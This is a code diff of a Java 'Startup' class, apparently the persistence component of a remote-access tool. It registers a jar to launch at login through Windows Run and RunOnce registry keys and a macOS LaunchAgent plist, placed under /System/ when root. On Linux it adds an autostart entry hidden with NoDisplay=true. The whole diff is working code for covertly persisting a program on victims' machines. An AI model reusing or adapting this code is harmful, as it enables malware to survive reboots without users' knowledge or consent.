@@ -12,30 +12,31 @@ import com.redpois0n.oslib.windows.WindowsVersion;
 
 public class Startup {
 
-    public static final void addToStartup(String name) throws Exception {
-        File currentJar = Utils.getJarFile();
+    public static void addToStartup(String name) throws Exception {
+    	addToStartup(Utils.getJarFile(), name, false);
+    }
 
+    public static void addToStartup(File file, String name, boolean runNextBoot) throws Exception {
         String home = System.getProperty("user.home");
 
         if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
             home = "/System/";
         }
-        if (currentJar.isFile() || currentJar.getName().endsWith(".jar")) {
+        if (file.isFile() || file.getName().endsWith(".jar")) {
             if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
                 String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
 
+                String path = runNextBoot ? "RunOnce" : "Run";
+
                 if (((WindowsOperatingSystem) OperatingSystem.getOperatingSystem()).getVersion() == WindowsVersion.WINXP) {            
-                    String data = javaHome + " -jar \"" + currentJar.getAbsolutePath() + "\"";
-                    Runtime.getRuntime().exec(new String[] { "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "/v", name, "/t", "REG_SZ", "/d", data, "/f"});
+                    String data = javaHome + " -jar \"" + file.getAbsolutePath() + "\"";
+                    
+                    Runtime.getRuntime().exec(new String[] { "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\" + path + "\\", "/v", name, "/t", "REG_SZ", "/d", data, "/f"});
                 } else {
-                    try {
-                        WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name);
-                    } catch (Exception ex) {
-                        ex.printStackTrace();
-                    }
-                    WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"");
-                
-                }
+                	String data = "\"" + javaHome + "\" -jar \"" + file.getAbsolutePath() + "\"";
+
+                    WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\" + path, name, data);            
+                }              
             } else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
                 File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.name + ".plist");
 
@@ -49,12 +50,12 @@ public class Startup {
                 out.println("<plist version=\"1.0\">");
                 out.println("<dict>");
                 out.println("   <key>Label</key>");
-                out.println("   <string>" + currentJar.getAbsolutePath().replace("file:", "").replace(".jar", "") + "</string>");
+                out.println("   <string>" + file.getAbsolutePath().replace("file:", "").replace(".jar", "") + "</string>");
                 out.println("   <key>ProgramArguments</key>");
                 out.println("   <array>");
                 out.println("      <string>java</string>");
                 out.println("      <string>-jar</string>");
-                out.println("      <string>" + currentJar.getAbsolutePath().replace("file:", "") + "</string>");
+                out.println("      <string>" + file.getAbsolutePath().replace("file:", "") + "</string>");
                 out.println("   </array>");
                 out.println("   <key>RunAtLoad</key>");
                 out.println("   <true/>");
@@ -74,7 +75,7 @@ public class Startup {
                 out.println("[Desktop Entry]");
                 out.println("Type=Application");
                 out.println("Name=" + Configuration.name);
-                out.println("Exec=java -jar '" + currentJar.getAbsolutePath() + "'");
+                out.println("Exec=java -jar '" + file.getAbsolutePath() + "'");
                 out.println("Terminal=false");
                 out.println("NoDisplay=true");
                 
